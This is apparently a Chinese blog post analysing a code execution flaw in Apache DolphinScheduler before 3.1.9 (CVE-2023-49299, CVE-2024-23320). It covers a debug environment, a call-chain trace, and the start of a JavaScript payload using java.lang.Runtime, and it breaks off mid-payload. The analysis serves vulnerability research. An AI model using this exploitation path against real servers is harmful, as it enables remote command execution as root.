{"title":"Apache DolphinScheduler 任意代码执行漏洞分析","uid":"651d2c36bfca60e4d9856f4d1d38b3ec","slug":"Apache DolphinScheduler 任意代码执行漏洞分析","date":"2024-04-26T04:00:00.000Z","updated":"2024-06-28T02:54:20.914Z","comments":true,"path":"api/articles/Apache DolphinScheduler 任意代码执行漏洞分析.json","keywords":null,"cover":"https://bu.dusays.com/2024/03/08/65ea8090a709b.png","content":"<p>包括如下几个 cve：CVE-2023-49299 CVE-2024-23320</p>\n<h1 id=\"漏洞描述\"><a href=\"#漏洞描述\" class=\"headerlink\" title=\"漏洞描述\"></a>漏洞描述</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>Apache DolphinScheduler 是一个分布式、易扩展、可视化的工作流任务调度平台。<br>Apache DolphinScheduler 3.1.9之前版本中，由于 SwitchTaskUtils#evaluate 方法未对用户可控的 expression 参数进行校验，经过身份验证的攻击者可在创建任务时传入恶意的任务内容，在服务端以 root 身份执行可逃逸沙箱的任意 js 代码。</p></blockquote>\n<p>根据漏洞描述，可以确定补丁应该是打在了 3.1.9 之前的版本，那我们可以找 3.1.8 版本进行分析<br>这里官网下一下源码，我的想法是生产机搭建 docker 镜像，远程接端口调试</p>\n<h1 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h1><p>一步一步来吧，环境搭建是漏洞复现和挖掘的第一步<br><a href=\"https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/start/docker\">https://dolphinscheduler.apache.org/zh-cn/docs/3.1.8/guide/start/docker</a><br>这里我选择是官方 3.1.8 的 docker 镜像,根据他官方使用手册来做能够顺利搭建起来<br>但是这里最主要的问题是如何连接远程调试<br>首先就是要重新起一个容器，一开始的 docker run 只开放了两个端口，这里我们还需要开一个端口用来远程连接</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">docker</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">run</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">--name</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">dolphinscheduler-standalone-server</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">12345</span><span style=\"color: #C3E88D\">:12345</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">25333</span><span style=\"color: #C3E88D\">:25333</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-p</span><span style=\"color: #BABED8\"> </span><span style=\"color: #F78C6C\">5005</span><span style=\"color: #C3E88D\">:5005</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-d</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">apache/dolphinscheduler-standalone-server:</span><span style=\"color: #89DDFF\">&quot;$&#123;</span><span style=\"color: #BABED8\">DOLPHINSCHEDULER_VERSION</span><span style=\"color: #89DDFF\">&#125;&quot;</span></span></code></pre></div><p>我选择 5005 端口用来远程调试，run 起来之后，进入容器</p>\n<div class=\"language-bash\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">bash</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">docker</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exec</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-it</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ContainerID</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">/bin/bash</span></span></code></pre></div><p>然后找到它的 start.sh 文件，添加上这么一句话</p>\n<div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #FFCB6B\">-Xdebug</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">-Xrunjdwp:transport=dt_socket,address=5005,server=y,suspend=n</span></span></code></pre></div><p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713248935247-d7cb1e8c-9979-4b0f-8794-35061f7f31df.png#averageHue=%23242435&clientId=uc9d24609-d755-4&from=paste&height=588&id=ud230d181&originHeight=1323&originWidth=2243&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=209783&status=done&style=none&taskId=uf96a6def-9104-439d-b481-7824750f0ea&title=&width=996.8888888888889\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>保存退出即可（这里可能容器没下 vim，apt update 更新一下就能下载了）<br>然后 docker restart，此时容器的 5005 端口就被视为了调试端口<br>然后是 idea 的设置，首先你源码得下下来，然后把依赖打上，之后 Configurations 选项中添加一个远程调试的选项，这么设置即可，这里 HOST 看你选的生产机的 ip 是多少，我这里是自己的 ubuntu 的虚拟机搭建的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713249035393-e2a679c8-e216-43a2-95a5-1c88573b171f.png#averageHue=%23242930&clientId=uc9d24609-d755-4&from=paste&height=458&id=u578b8a6f&originHeight=1030&originWidth=1422&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=119329&status=done&style=none&taskId=uc8e121aa-94dc-4a7b-910a-1409b25757a&title=&width=632\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>设置好之后可以开启调试，如果出现 connected 字样，那就是说明远程调试连接成功了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713249101384-f848665d-321c-41d0-9212-3f23a8329667.png#averageHue=%23353a43&clientId=uc9d24609-d755-4&from=paste&height=160&id=ua15a2fee&originHeight=360&originWidth=1622&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=113607&status=done&style=none&taskId=uf43f1a4f-0d20-4d6b-9fb7-21b2e4f93eb&title=&width=720.8888888888889\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<h1 id=\"CVE-2023-49299-CVE-2024-23320\"><a href=\"#CVE-2023-49299-CVE-2024-23320\" class=\"headerlink\" title=\"CVE-2023-49299 CVE-2024-23320\"></a>CVE-2023-49299 CVE-2024-23320</h1><h2 id=\"漏洞点分析\"><a href=\"#漏洞点分析\" class=\"headerlink\" title=\"漏洞点分析\"></a>漏洞点分析</h2><p>根据漏洞描述，我们可以在源码中定位到最终的代码执行点<br>定位到DolphinScheduler 模块，utils 包下的 SwitchTaskUtils 类，在 3.1.8 版本，也就是最后一个尚未修复的版本中，如果存在功能点调用了其 evaluate 方法，是不会有任何过滤的，能够直接执行<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713253606969-dde24e27-2049-4bdb-b9e6-b5f9462a8927.png#averageHue=%23333941&clientId=uc9d24609-d755-4&from=paste&height=400&id=u55caafd4&originHeight=750&originWidth=1730&originalType=binary&ratio=1.6500000953674316&rotation=0&showTitle=false&size=390973&status=done&style=none&taskId=u05c53d3f-a1ad-44c3-a6e3-c3374ba9356&title=&width=922.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>首先要明确这个类的作用是什么，evaluate 这个方法该如何触发？明确这个问题之后我们往上去寻找相关的调用<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713259939579-7eb120ea-220e-4a1e-b941-6312eb18d8d0.png#averageHue=%23384050&clientId=u1d2f8c05-c968-4&from=paste&height=125&id=ue1bde6be&originHeight=234&originWidth=1141&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=108669&status=done&style=none&taskId=u4b3000f4-4a88-407a-947d-5a1fb1e52d2&title=&width=608.5333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>只有一处，<code>SwitchTaskProcessor</code> 类的 setSwitchResult 方法中，整体的逻辑由于不太清楚目的是什么，所以不太能读懂，关注最终的 evaluate 方法调用及相关即可<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713260127484-bfcc1ee3-5a99-49ae-b6e7-f1a8884f79cc.png#averageHue=%23353b44&clientId=u1d2f8c05-c968-4&from=paste&height=349&id=u5c9574ee&originHeight=655&originWidth=1386&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=331043&status=done&style=none&taskId=u41fe78b9-c79d-42ee-8fbd-a0aa8d927bd&title=&width=739.2\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里注意到传入 evaluate 方法的参数是 content，content 是经过 setTaskParams 方法处理之后得来的，做个标记，之后再来看，因为现在我们并不清楚这里一套流程走下来到底是由谁触发的<br>继续往上寻找<code>setSwitchResult</code>的相关调用<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713265341677-419394e6-e36b-4073-a040-76754ca48a82.png#averageHue=%23343b47&clientId=u1d2f8c05-c968-4&from=paste&height=193&id=u85212f23&originHeight=362&originWidth=1152&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=123530&status=done&style=none&taskId=u98f17072-9350-40a5-90ec-57831666a5d&title=&width=614.4\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>也是只有一处，当前类的 runTask 方法，其实到这就有点预感了，结合漏洞报告中的” 经过身份验证的攻击者可在创建任务时传入恶意的任务内容  “，也就是说我们当前是在走”创建任务，执行任务内容”的流程<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713265362544-06e81e1e-ae92-46bf-aeca-01803efc7a5f.png#averageHue=%23343a43&clientId=u1d2f8c05-c968-4&from=paste&height=354&id=ua4b5dca8&originHeight=663&originWidth=1917&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=338477&status=done&style=none&taskId=u4ccebd24-d937-487f-97c9-c07a0fc9420&title=&width=1022.4\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>再继续往上调用，有一层 run 方法的包装，里面只调用了 runTask 方法，这里继续往上寻找 run 方法的调用<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713265773807-dfd47645-857f-4ba2-a31b-fd339f3c539f.png#averageHue=%2332363e&clientId=u1d2f8c05-c968-4&from=paste&height=193&id=u25d7272e&originHeight=362&originWidth=1196&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=126441&status=done&style=none&taskId=u967b384d-a1d1-4431-8944-2f242ff8a2d&title=&width=637.8666666666667\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>找到了 BaseTaskProcessor 的 action 方法，大部分内容都是由一个 switch 函数填充，<code>SwitchTaskProcessor</code>类本身就是BaseTaskProcessor 的子类，所以这里我们可以猜测，BaseTaskProcessor 最先接收到执行请求，然后通过我们读取我们的提交行为，switch 到不同的 Processor 中执行不同的逻辑（这一点其实从 runner 包中就就能看出）</p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF\">@</span><span style=\"color: #C792EA\">Override</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #C792EA\">public</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C792EA\">boolean</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">action</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #C792EA\">TaskAction</span><span style=\"color: #BABED8\"> taskAction</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF\">........</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">try</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">switch</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">(</span><span style=\"color: #BABED8\">taskAction</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">case</span><span style=\"color: #BABED8\"> STOP</span><span style=\"color: #89DDFF; font-style: italic\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    result </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">stop</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">case</span><span style=\"color: #BABED8\"> PAUSE</span><span style=\"color: #89DDFF; font-style: italic\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    result </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">pause</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">case</span><span style=\"color: #BABED8\"> TIMEOUT</span><span style=\"color: #89DDFF; font-style: italic\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    result </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">timeout</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">case</span><span style=\"color: #BABED8\"> SUBMIT</span><span style=\"color: #89DDFF; font-style: italic\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    result </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">submit</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">case</span><span style=\"color: #BABED8\"> RUN</span><span style=\"color: #89DDFF; font-style: italic\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    result </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">run</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">case</span><span style=\"color: #BABED8\"> DISPATCH</span><span style=\"color: #89DDFF; font-style: italic\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    result </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">dispatch</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">case</span><span style=\"color: #BABED8\"> RESUBMIT</span><span style=\"color: #89DDFF; font-style: italic\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    result </span><span style=\"color: #89DDFF\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #82AAFF\">resubmit</span><span style=\"color: #89DDFF\">();</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">break</span><span style=\"color: #89DDFF\">;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">default:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    logger</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #82AAFF\">error</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">unknown task action: &#123;&#125;</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #89DDFF\">,</span><span style=\"color: #BABED8\"> taskAction</span><span style=\"color: #89DDFF\">);</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> result</span><span style=\"color: #89DDFF\">;</span></span></code></pre></div><p>还有一点比较重要，此时 switch 中的判断参数叫做 TaskAction，任务行为，我们进后台是能够找到对应的板块的<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713266027882-69f92008-d375-417a-bc0a-6088bedefa0a.png#averageHue=%23f7f9fb&clientId=u1d2f8c05-c968-4&from=paste&height=318&id=u10a9d512&originHeight=597&originWidth=398&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=12591&status=done&style=none&taskId=uaa7ab35a-32cc-486a-8ed1-5902b7d7ff5&title=&width=212.26666666666668\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>那大致可以确定漏洞的触发是在创建完任务之后，执行任务时触发的，那也可以同时确定 content 内容的传值就是创建任务时的某个参数<br>这个任务并不是所有的类型都能够走到 SwitchTaskUtils 最终触发的地方，所以还一定是 Switch 类型的任务<br>这里我经过一段时间的摸索，发现任务的创建依赖于工作流，其实一个工作流就对应一个任务，我们创建任务的过程，其实就是在创建工作流的过程。然后一个项目中能够有很多个工作流，项目必须归属到一个租户上面，这个租户其实就是你当前容器的用户–root 即可<br>了解完上面这些，我们能够大致的走一遍工作流程了</p>\n<h3 id=\"0x01-工作流程分析\"><a href=\"#0x01-工作流程分析\" class=\"headerlink\" title=\"0x01 工作流程分析\"></a>0x01 工作流程分析</h3><p>首先创建一个工作流，这是一个可视化的过程，DolphinScheduler 以图示来简化操作，这里我们就能够看到 SwitchTask 到底是个什么东西了<br>他其实就是工作流中的一个选项标签，本身就叫 switch，正常使用不报错的话，这么做即可<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713266782079-1130afd3-df64-4b9b-8d99-c73ee7797f48.png#averageHue=%23fcfcfc&clientId=u1d2f8c05-c968-4&from=paste&height=91&id=ue9075e8b&originHeight=170&originWidth=1138&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=12512&status=done&style=none&taskId=u1a5649af-0914-40aa-b9f5-c0e31307730&title=&width=606.9333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>然后这里的设置肯定有一个部分是关于 content 参数的传递，这里可控文本就两个，我们描述或者条件选项，这里稍微打断点调试了一下，发现最终条件栏的数据会被接收，并且作为 Content 的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713266773771-cee77a53-07ae-454e-9570-719c181b2987.png#averageHue=%23fefefe&clientId=u1d2f8c05-c968-4&from=paste&height=635&id=u16536ae0&originHeight=1190&originWidth=893&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=42875&status=done&style=none&taskId=u34a9c462-cd83-44ed-86b7-445277979c7&title=&width=476.26666666666665\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>明白了这些就可以走一遍调试了<br>断点打在 submitTaskExec 的 <code>taskProcessor.action(TaskAction.RUN);</code> 处（这里注意，我们刚开始调试接收到的情况并非直接到 RUN 的 action 方法，而是 SUBMIT 分支和一个 DISPATCH 分支，它得先提交完这个请求，并且判断工作类中的部分类型之后进行 DISPATCH 分发，才能进行具体的部分 RUN处理）这个 submitTaskExec 方法其实也就是 action 方法上一级调用</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713267340921-4dda6728-72ef-478c-b980-e9c5bcfd8a35.png#averageHue=%23424855&clientId=u1d2f8c05-c968-4&from=paste&height=151&id=ub0134e15&originHeight=284&originWidth=1746&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=158554&status=done&style=none&taskId=u57cdd1c0-8ba3-4d7d-a5c7-8b883081ea7&title=&width=931.2\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>跟进 RUN 方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713267400963-9d893fad-b2bd-45c0-9b86-8440d6b9fe2a.png#averageHue=%23565a6d&clientId=u1d2f8c05-c968-4&from=paste&height=53&id=u54eb9508&originHeight=100&originWidth=760&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=19277&status=done&style=none&taskId=u59f0f2cd-7079-4430-8a68-13487275286&title=&width=405.3333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>直至跟进到 runTask 的具体处理，他这里的逻辑其实是先获取各类信息之后，去执行 Switch 块的逻辑，并且 setSwitchResult 方法返回的是一个布尔值，用来检测我们正常的 Switch 执行逻辑是否出错<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713267453172-634d4c21-1fe5-4156-af6a-9a527eb830d6.png#averageHue=%233c414c&clientId=u1d2f8c05-c968-4&from=paste&height=309&id=u42fc8ec3&originHeight=579&originWidth=1430&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=262919&status=done&style=none&taskId=u9b1142a3-6680-44e5-b663-b4264c97d4f&title=&width=762.6666666666666\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>跟进到 setSwitchResult 方法<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713267749482-69cdece5-f9a2-48c3-bef0-45d039e79ed0.png#averageHue=%233a404a&clientId=u1d2f8c05-c968-4&from=paste&height=340&id=u2db7a8e5&originHeight=638&originWidth=1462&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=375558&status=done&style=none&taskId=u5f78b05e-2d98-4622-837f-7be97592cf3&title=&width=779.7333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>前面在获取一些基本信息，最为关键的获取是<code>SwitchParameters switchParameters = taskInstance.getSwitchDependency();</code>也就是从任务实体中获取到我们当前 Switch 的参数，它本身作为 switch 块，其中的条件设置就是参数设置，这也是为什么他要去执行 JS 代码的原因，得到的结果进行一个返回，达到一个 if 判断的效果<br>看一下最终的获取效果（这里我单独把 taskParams 拎了出来）<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713267931532-3cd4231a-6c87-443d-bb16-35e760b81b14.png#averageHue=%232a313d&clientId=u1d2f8c05-c968-4&from=paste&height=301&id=u452647a1&originHeight=565&originWidth=858&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=112519&status=done&style=none&taskId=u2a8162bf-5021-4696-928c-f0b4a8db77d&title=&width=457.6\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里的switchResultVo，之后会被作为 for 循环的基本单位进行循环遍历，也就是后续的传入 setTaskParams 方法 <code>info</code><br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713264866435-7de9c8c8-35f0-4835-94bc-e7d99a1724f0.png#averageHue=%23383e4a&clientId=u1d2f8c05-c968-4&from=paste&height=222&id=ua7e3787e&originHeight=416&originWidth=2004&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=234640&status=done&style=none&taskId=u67ad065b-490d-46b2-a517-a54f1ea9c1b&title=&width=1068.8\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>跟进setTaskParams 看看参数处理<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713268904744-576ef266-307f-4433-810e-a482410b7dc0.png#averageHue=%233a404a&clientId=u1d2f8c05-c968-4&from=paste&height=465&id=u2e4aa1c9&originHeight=872&originWidth=2208&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=582526&status=done&style=none&taskId=ud41e477e-2e3c-4b0e-ab3d-73653e5766b&title=&width=1177.6\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里首先根据一个正则表达式创建了一个 Matcher 对象，这个 Matcher 对象的作用是用来专门匹配<code>$&#123;...&#125;</code>内容的比较器（？），根绝结果来看，由于我们此时 content 的形式是<code>var a=1;</code>所以肯定不会符合格式要求，后续的 while 循环处理自然也不会跟进，直接跳到了最后的 return content<br>两个 MAP 的数据处理都是返回 null，这一点从 SwitchParameters 参数获取就看能看出<br>这里返回出去之后就是直接来到 evaluate 了<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713269992763-fb8ab28a-e126-45b2-87ab-a687b273ef5c.png#averageHue=%234c5160&clientId=u1d2f8c05-c968-4&from=paste&height=110&id=u9baacaca&originHeight=206&originWidth=1645&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=92606&status=done&style=none&taskId=ueaadcd69-079a-4af8-bcae-bf1931db0d4&title=&width=877.3333333333334\" referrerpolicy=\"no-referrer\" alt=\"image.png\"><br>这里可以参考一下 JAVA 的 js 代码执行，ScriptEngine 本身就是用 java 来实现 JS 代码执行的扩展，所以它本质还是 java 代码的执行，里面能够任意写 java 代码</p>\n<h3 id=\"0x02-漏洞攻击实现\"><a href=\"#0x02-漏洞攻击实现\" class=\"headerlink\" title=\"0x02 漏洞攻击实现\"></a>0x02 漏洞攻击实现</h3><p>正常的传一个 JS 的 RCE 试试<br><img src=\"https://cdn.nlark.com/yuque/0/2024/png/36078896/1713278858342-e797cebc-7b2e-488d-b9a0-a70ab2fc70bd.png#averageHue=%23fefefe&clientId=u600d120d-c14e-4&from=paste&height=631&id=u57243c68&originHeight=1183&originWidth=874&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=43527&status=done&style=none&taskId=u6bded3b5-9fd6-4b06-ac0b-d6896f57b97&title=&width=466.1333333333333\" referrerpolicy=\"no-referrer\" alt=\"image.png\"></p>\n<div class=\"language-java\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">java</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #BABED8\">function </span><span style=\"color: #82AAFF\">test</span><span style=\"color: #89DDFF\">()&#123;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> java</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">lang</span><span style=\"color: #89DDFF\">.</span><span style=\"color: #BABED8\">Runtime</span><span style=\"color: #89DDFF\">&#125;;</span><span style=\"color: #BABED8\">r</span><span style=\"color: #89DDFF\">=</span><span style=\"color: #82AAFF\">test</span><span style=\"color: #89DDFF\">();</span><span style=\"color: #BABED8\">r</span><span style=\"color: #89DDFF\">.</span><span style=\"color: 